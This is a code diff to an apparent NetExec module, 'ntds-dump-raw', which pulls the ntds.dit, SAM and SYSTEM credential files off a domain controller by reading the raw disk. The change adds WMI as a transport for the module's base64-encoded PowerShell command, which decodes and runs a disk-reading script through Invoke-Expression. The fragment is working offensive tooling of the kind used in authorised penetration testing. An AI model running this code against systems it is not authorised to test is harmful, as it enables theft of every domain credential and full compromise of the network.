@@ -18,7 +18,7 @@ from nxc.helpers.powershell import get_ps_script
 class NXCModule:
     name = "ntds-dump-raw"
     description = "Extracting the ntds.dit, SAM, and SYSTEM files from DC by accessing the raw hard drive."
-    supported_protocols = ["smb", "winrm"]
+    supported_protocols = ["smb", "wmi", "winrm"]
 
     files_full_location_to_extract = [
         "Windows/System32/config/SYSTEM",
@@ -91,7 +91,10 @@ class NXCModule:
         # scary base64 powershell code :)
         # This to read the PhysicalDrive0 file
         get_data_script = f"""powershell.exe -c "$base64Cmd = '{self.ps_script_b64}';$decodedCmd = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($base64Cmd)) + '; read_disk {offset} {fixed_size}'; Invoke-Expression $decodedCmd" """
-        data_output = self.execute(get_data_script, True)
+        if self.connection.__class__.__name__ == "wmi":  # noqa: SIM108
+            data_output = self.connection.execute_psh(get_data_script, True)
+        else:
+            data_output = self.execute(get_data_script, True)
         self.logger.debug(f"{offset=},{size=},{fixed_size=}")
         compressed_bytes = b64decode(data_output)[:size]
         compressed_stream = BytesIO(compressed_bytes)
